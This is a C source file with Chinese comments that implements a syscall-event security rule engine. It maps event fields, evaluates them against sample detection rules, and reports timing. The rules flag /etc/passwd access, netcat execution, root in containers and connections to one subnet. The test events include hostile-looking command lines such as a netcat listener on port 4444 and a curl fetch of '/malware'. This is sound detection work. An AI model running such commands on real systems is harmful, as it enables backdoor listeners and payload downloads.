#define _GNU_SOURCE
#include "field_mapper.h"
#include <stddef.h>
#include <time.h>
#include <string.h>

// 定义事件类型
typedef enum {
    EVENT_TYPE_OPEN = 1,
    EVENT_TYPE_CLOSE = 2,
    EVENT_TYPE_READ = 3,
    EVENT_TYPE_WRITE = 4,
    EVENT_TYPE_EXEC = 5,
    EVENT_TYPE_CONNECT = 6
} event_type_t;

// 定义文件信息
typedef struct {
    char path[512];
    char name[256];
    uint32_t fd;
    uint32_t flags;
} file_info_t;

// 定义网络信息
typedef struct {
    char src_ip[64];
    char dst_ip[64];
    uint16_t src_port;
    uint16_t dst_port;
    char protocol[16];
} net_info_t;

// 定义进程信息
typedef struct {
    int32_t pid;
    int32_t ppid;
    int32_t uid;
    int32_t gid;
    char name[256];
    char cmdline[1024];
    char exe[512];
    bool is_container;
    char container_id[128];
} process_info_t;

// 定义完整的事件结构
typedef struct {
    event_type_t type;
    uint64_t timestamp;
    uint32_t tid;
    char direction[16];
    int32_t retval;
    process_info_t proc;
    file_info_t file;
    net_info_t net;
} syscall_event_t;

// 规则条件类型
typedef enum {
    CONDITION_EQ,      // 等于
    CONDITION_NE,      // 不等于
    CONDITION_GT,      // 大于
    CONDITION_LT,      // 小于
    CONDITION_CONTAINS,// 包含
    CONDITION_STARTS,  // 开始于
    CONDITION_ENDS     // 结束于
} condition_type_t;

// 规则条件
typedef struct {
    char field_name[128];
    condition_type_t type;
    char value[256];
    field_type_t field_type;
} rule_condition_t;

// 简单规则结构
typedef struct {
    char name[128];
    char description[512];
    rule_condition_t conditions[10];  // 最多10个条件
    int condition_count;
    bool enabled;
} security_rule_t;

// 规则引擎
typedef struct {
    field_mapper_t *mapper;
    security_rule_t rules[100];  // 最多100个规则
    int rule_count;
} rule_engine_t;

// 初始化规则引擎
rule_engine_t* rule_engine_init(void) {
    rule_engine_t *engine = (rule_engine_t*)malloc(sizeof(rule_engine_t));
    if (!engine) return NULL;
    
    engine->mapper = field_mapper_init();
    if (!engine->mapper) {
        free(engine);
        return NULL;
    }
    
    engine->rule_count = 0;
    
    // 创建事件表并设置字段映射
    field_mapper_create_table(engine->mapper, "event");
    
    // 基本事件字段
    ADD_FIELD_MAPPING(engine->mapper, "event", syscall_event_t, type, FIELD_TYPE_INT32);
    ADD_FIELD_MAPPING(engine->mapper, "event", syscall_event_t, timestamp, FIELD_TYPE_UINT64);
    ADD_FIELD_MAPPING(engine->mapper, "event", syscall_event_t, tid, FIELD_TYPE_UINT32);
    ADD_FIELD_MAPPING(engine->mapper, "event", syscall_event_t, direction, FIELD_TYPE_STRING);
    ADD_FIELD_MAPPING(engine->mapper, "event", syscall_event_t, retval, FIELD_TYPE_INT32);
    
    // 进程字段
    field_mapper_add_field(engine->mapper, "event", "proc.pid",
                          offsetof(syscall_event_t, proc) + offsetof(process_info_t, pid),
                          FIELD_TYPE_INT32, sizeof(int32_t));
    field_mapper_add_field(engine->mapper, "event", "proc.ppid",
                          offsetof(syscall_event_t, proc) + offsetof(process_info_t, ppid),
                          FIELD_TYPE_INT32, sizeof(int32_t));
    field_mapper_add_field(engine->mapper, "event", "proc.uid",
                          offsetof(syscall_event_t, proc) + offsetof(process_info_t, uid),
                          FIELD_TYPE_INT32, sizeof(int32_t));
    field_mapper_add_field(engine->mapper, "event", "proc.name",
                          offsetof(syscall_event_t, proc) + offsetof(process_info_t, name),
                          FIELD_TYPE_STRING, sizeof(((process_info_t*)0)->name));
    field_mapper_add_field(engine->mapper, "event", "proc.cmdline",
                          offsetof(syscall_event_t, proc) + offsetof(process_info_t, cmdline),
                          FIELD_TYPE_STRING, sizeof(((process_info_t*)0)->cmdline));
    field_mapper_add_field(engine->mapper, "event", "proc.exe",
                          offsetof(syscall_event_t, proc) + offsetof(process_info_t, exe),
                          FIELD_TYPE_STRING, sizeof(((process_info_t*)0)->exe));
    field_mapper_add_field(engine->mapper, "event", "proc.is_container",
                          offsetof(syscall_event_t, proc) + offsetof(process_info_t, is_container),
                          FIELD_TYPE_BOOL, sizeof(bool));
    field_mapper_add_field(engine->mapper, "event", "proc.container_id",
                          offsetof(syscall_event_t, proc) + offsetof(process_info_t, container_id),
                          FIELD_TYPE_STRING, sizeof(((process_info_t*)0)->container_id));
    
    // 文件字段
    field_mapper_add_field(engine->mapper, "event", "file.path",
                          offsetof(syscall_event_t, file) + offsetof(file_info_t, path),
                          FIELD_TYPE_STRING, sizeof(((file_info_t*)0)->path));
    field_mapper_add_field(engine->mapper, "event", "file.name",
                          offsetof(syscall_event_t, file) + offsetof(file_info_t, name),
                          FIELD_TYPE_STRING, sizeof(((file_info_t*)0)->name));
    field_mapper_add_field(engine->mapper, "event", "file.fd",
                          offsetof(syscall_event_t, file) + offsetof(file_info_t, fd),
                          FIELD_TYPE_UINT32, sizeof(uint32_t));
    
    // 网络字段
    field_mapper_add_field(engine->mapper, "event", "net.src_ip",
                          offsetof(syscall_event_t, net) + offsetof(net_info_t, src_ip),
                          FIELD_TYPE_STRING, sizeof(((net_info_t*)0)->src_ip));
    field_mapper_add_field(engine->mapper, "event", "net.dst_ip",
                          offsetof(syscall_event_t, net) + offsetof(net_info_t, dst_ip),
                          FIELD_TYPE_STRING, sizeof(((net_info_t*)0)->dst_ip));
    field_mapper_add_field(engine->mapper, "event", "net.dst_port",
                          offsetof(syscall_event_t, net) + offsetof(net_info_t, dst_port),
                          FIELD_TYPE_UINT32, sizeof(uint16_t));
    
    return engine;
}

// 销毁规则引擎
void rule_engine_destroy(rule_engine_t *engine) {
    if (!engine) return;
    field_mapper_destroy(engine->mapper);
    free(engine);
}

// 添加规则
int rule_engine_add_rule(rule_engine_t *engine, const security_rule_t *rule) {
    if (!engine || !rule || engine->rule_count >= 100) {
        return -1;
    }
    
    engine->rules[engine->rule_count] = *rule;
    engine->rule_count++;
    return 0;
}

// 检查条件是否匹配
bool check_condition(const rule_condition_t *condition, const void *value, field_type_t type) {
    if (!condition || !value) return false;
    
    switch (type) {
        case FIELD_TYPE_INT32: {
            int32_t field_val = *(int32_t*)value;
            int32_t rule_val = atoi(condition->value);
            switch (condition->type) {
                case CONDITION_EQ: return field_val == rule_val;
                case CONDITION_NE: return field_val != rule_val;
                case CONDITION_GT: return field_val > rule_val;
                case CONDITION_LT: return field_val < rule_val;
                default: return false;
            }
        }
        case FIELD_TYPE_UINT32: {
            uint32_t field_val = *(uint32_t*)value;
            uint32_t rule_val = (uint32_t)atoi(condition->value);
            switch (condition->type) {
                case CONDITION_EQ: return field_val == rule_val;
                case CONDITION_NE: return field_val != rule_val;
                case CONDITION_GT: return field_val > rule_val;
                case CONDITION_LT: return field_val < rule_val;
                default: return false;
            }
        }
        case FIELD_TYPE_STRING: {
            const char *field_val = (const char*)value;
            switch (condition->type) {
                case CONDITION_EQ: return strcmp(field_val, condition->value) == 0;
                case CONDITION_NE: return strcmp(field_val, condition->value) != 0;
                case CONDITION_CONTAINS: return strstr(field_val, condition->value) != NULL;
                case CONDITION_STARTS: return strncmp(field_val, condition->value, strlen(condition->value)) == 0;
                case CONDITION_ENDS: {
                    size_t field_len = strlen(field_val);
                    size_t rule_len = strlen(condition->value);
                    if (field_len < rule_len) return false;
                    return strcmp(field_val + field_len - rule_len, condition->value) == 0;
                }
                default: return false;
            }
        }
        case FIELD_TYPE_BOOL: {
            bool field_val = *(bool*)value;
            bool rule_val = (strcmp(condition->value, "true") == 0);
            switch (condition->type) {
                case CONDITION_EQ: return field_val == rule_val;
                case CONDITION_NE: return field_val != rule_val;
                default: return false;
            }
        }
        default:
            return false;
    }
}

// 评估规则
bool rule_engine_evaluate(rule_engine_t *engine, const syscall_event_t *event, 
                         char *matched_rules, size_t matched_rules_size) {
    if (!engine || !event) return false;
    
    bool any_match = false;
    matched_rules[0] = '\0';
    
    for (int i = 0; i < engine->rule_count; i++) {
        const security_rule_t *rule = &engine->rules[i];
        if (!rule->enabled) continue;
        
        bool rule_match = true;
        
        // 检查所有条件
        for (int j = 0; j < rule->condition_count; j++) {
            const rule_condition_t *condition = &rule->conditions[j];
            
            // 查询字段值
            field_query_result_t result = field_mapper_query_value(
                engine->mapper, "event", condition->field_name, event);
            
            if (!result.found) {
                rule_match = false;
                break;
            }
            
            // 检查条件
            if (!check_condition(condition, result.value_ptr, result.type)) {
                rule_match = false;
                break;
            }
        }
        
        if (rule_match) {
            any_match = true;
            if (strlen(matched_rules) > 0) {
                strncat(matched_rules, ", ", matched_rules_size - strlen(matched_rules) - 1);
            }
            strncat(matched_rules, rule->name, matched_rules_size - strlen(matched_rules) - 1);
        }
    }
    
    return any_match;
}

// 创建示例规则
void create_sample_rules(rule_engine_t *engine) {
    security_rule_t rule;
    
    // 规则1: 检测访问敏感文件
    strcpy(rule.name, "Sensitive File Access");
    strcpy(rule.description, "Detect access to sensitive configuration files");
    rule.enabled = true;
    rule.condition_count = 2;
    
    strcpy(rule.conditions[0].field_name, "type");
    rule.conditions[0].type = CONDITION_EQ;
    strcpy(rule.conditions[0].value, "1");  // EVENT_TYPE_OPEN
    rule.conditions[0].field_type = FIELD_TYPE_INT32;
    
    strcpy(rule.conditions[1].field_name, "file.path");
    rule.conditions[1].type = CONDITION_CONTAINS;
    strcpy(rule.conditions[1].value, "/etc/passwd");
    rule.conditions[1].field_type = FIELD_TYPE_STRING;
    
    rule_engine_add_rule(engine, &rule);
    
    // 规则2: 检测可疑进程执行
    strcpy(rule.name, "Suspicious Process Execution");
    strcpy(rule.description, "Detect execution of potentially malicious processes");
    rule.enabled = true;
    rule.condition_count = 2;
    
    strcpy(rule.conditions[0].field_name, "type");
    rule.conditions[0].type = CONDITION_EQ;
    strcpy(rule.conditions[0].value, "5");  // EVENT_TYPE_EXEC
    rule.conditions[0].field_type = FIELD_TYPE_INT32;
    
    strcpy(rule.conditions[1].field_name, "proc.name");
    rule.conditions[1].type = CONDITION_CONTAINS;
    strcpy(rule.conditions[1].value, "netcat");
    rule.conditions[1].field_type = FIELD_TYPE_STRING;
    
    rule_engine_add_rule(engine, &rule);
    
    // 规则3: 检测容器中的特权操作
    strcpy(rule.name, "Container Privilege Escalation");
    strcpy(rule.description, "Detect privilege escalation in containers");
    rule.enabled = true;
    rule.condition_count = 2;
    
    strcpy(rule.conditions[0].field_name, "proc.is_container");
    rule.conditions[0].type = CONDITION_EQ;
    strcpy(rule.conditions[0].value, "true");
    rule.conditions[0].field_type = FIELD_TYPE_BOOL;
    
    strcpy(rule.conditions[1].field_name, "proc.uid");
    rule.conditions[1].type = CONDITION_EQ;
    strcpy(rule.conditions[1].value, "0");  // root
    rule.conditions[1].field_type = FIELD_TYPE_INT32;
    
    rule_engine_add_rule(engine, &rule);
    
    // 规则4: 检测网络连接
    strcpy(rule.name, "Suspicious Network Connection");
    strcpy(rule.description, "Detect connections to suspicious IP addresses");
    rule.enabled = true;
    rule.condition_count = 2;
    
    strcpy(rule.conditions[0].field_name, "type");
    rule.conditions[0].type = CONDITION_EQ;
    strcpy(rule.conditions[0].value, "6");  // EVENT_TYPE_CONNECT
    rule.conditions[0].field_type = FIELD_TYPE_INT32;
    
    strcpy(rule.conditions[1].field_name, "net.dst_ip");
    rule.conditions[1].type = CONDITION_STARTS;
    strcpy(rule.conditions[1].value, "192.168.1");
    rule.conditions[1].field_type = FIELD_TYPE_STRING;
    
    rule_engine_add_rule(engine, &rule);
}

int main() {
    printf("=== Security Rule Engine Example ===\n\n");
    
    // 初始化规则引擎
    rule_engine_t *engine = rule_engine_init();
    if (!engine) {
        printf("Failed to initialize rule engine\n");
        return 1;
    }
    
    // 创建示例规则
    create_sample_rules(engine);
    printf("Created %d security rules\n\n", engine->rule_count);
    
    // 创建测试事件
    syscall_event_t events[] = {
        // 事件1: 正常文件访问
        {
            .type = EVENT_TYPE_OPEN,
            .timestamp = 1234567890UL,
            .tid = 1234,
            .direction = "ingress",
            .retval = 0,
            .proc = {
                .pid = 1234, .ppid = 1, .uid = 1000, .gid = 1000,
                .name = "cat", .cmdline = "cat /home/user/file.txt",
                .exe = "/bin/cat", .is_container = false, .container_id = ""
            },
            .file = {
                .path = "/home/user/file.txt", .name = "file.txt",
                .fd = 3, .flags = 0
            }
        },
        
        // 事件2: 访问敏感文件
        {
            .type = EVENT_TYPE_OPEN,
            .timestamp = 1234567891UL,
            .tid = 1235,
            .direction = "ingress",
            .retval = 0,
            .proc = {
                .pid = 1235, .ppid = 1, .uid = 1000, .gid = 1000,
                .name = "cat", .cmdline = "cat /etc/passwd",
                .exe = "/bin/cat", .is_container = false, .container_id = ""
            },
            .file = {
                .path = "/etc/passwd", .name = "passwd",
                .fd = 3, .flags = 0
            }
        },
        
        // 事件3: 可疑进程执行
        {
            .type = EVENT_TYPE_EXEC,
            .timestamp = 1234567892UL,
            .tid = 1236,
            .direction = "ingress",
            .retval = 0,
            .proc = {
                .pid = 1236, .ppid = 1235, .uid = 1000, .gid = 1000,
                .name = "netcat", .cmdline = "netcat -l -p 4444",
                .exe = "/usr/bin/netcat", .is_container = false, .container_id = ""
            }
        },
        
        // 事件4: 容器中的特权操作
        {
            .type = EVENT_TYPE_EXEC,
            .timestamp = 1234567893UL,
            .tid = 1237,
            .direction = "ingress",
            .retval = 0,
            .proc = {
                .pid = 1237, .ppid = 1, .uid = 0, .gid = 0,
                .name = "bash", .cmdline = "bash",
                .exe = "/bin/bash", .is_container = true, 
                .container_id = "abc123def456"
            }
        },
        
        // 事件5: 网络连接
        {
            .type = EVENT_TYPE_CONNECT,
            .timestamp = 1234567894UL,
            .tid = 1238,
            .direction = "egress",
            .retval = 0,
            .proc = {
                .pid = 1238, .ppid = 1, .uid = 1000, .gid = 1000,
                .name = "curl", .cmdline = "curl http://192.168.1.100/malware",
                .exe = "/usr/bin/curl", .is_container = false, .container_id = ""
            },
            .net = {
                .src_ip = "10.0.0.1", .dst_ip = "192.168.1.100",
                .src_port = 45678, .dst_port = 80, .protocol = "TCP"
            }
        }
    };
    
    int event_count = sizeof(events) / sizeof(events[0]);
    
    printf("=== Evaluating %d events ===\n\n", event_count);
    
    // 性能测试
    clock_t start = clock();
    int total_matches = 0;
    
    for (int i = 0; i < event_count; i++) {
        char matched_rules[1024];
        bool match = rule_engine_evaluate(engine, &events[i], matched_rules, sizeof(matched_rules));
        
        printf("Event %d (type=%d, proc=%s):\n", i + 1, events[i].type, events[i].proc.name);
        if (match) {
            printf("  ⚠️  ALERT: Matched rules: %s\n", matched_rules);
            total_matches++;
        } else {
            printf("  ✅ No rules matched\n");
        }
        printf("\n");
    }
    
    clock_t end = clock();
    double cpu_time_used = ((double)(end - start)) / CLOCKS_PER_SEC;
    
    printf("=== Performance Summary ===\n");
    printf("Processed %d events in %f seconds\n", event_count, cpu_time_used);
    printf("Average time per event: %f microseconds\n", (cpu_time_used * 1000000) / event_count);
    printf("Total rule matches: %d\n", total_matches);
    printf("Rules evaluated per second: %.0f\n", (event_count * engine->rule_count) / cpu_time_used);
    
    // 清理资源
    rule_engine_destroy(engine);
    
    printf("\nRule engine example completed successfully!\n");
    return 0;
}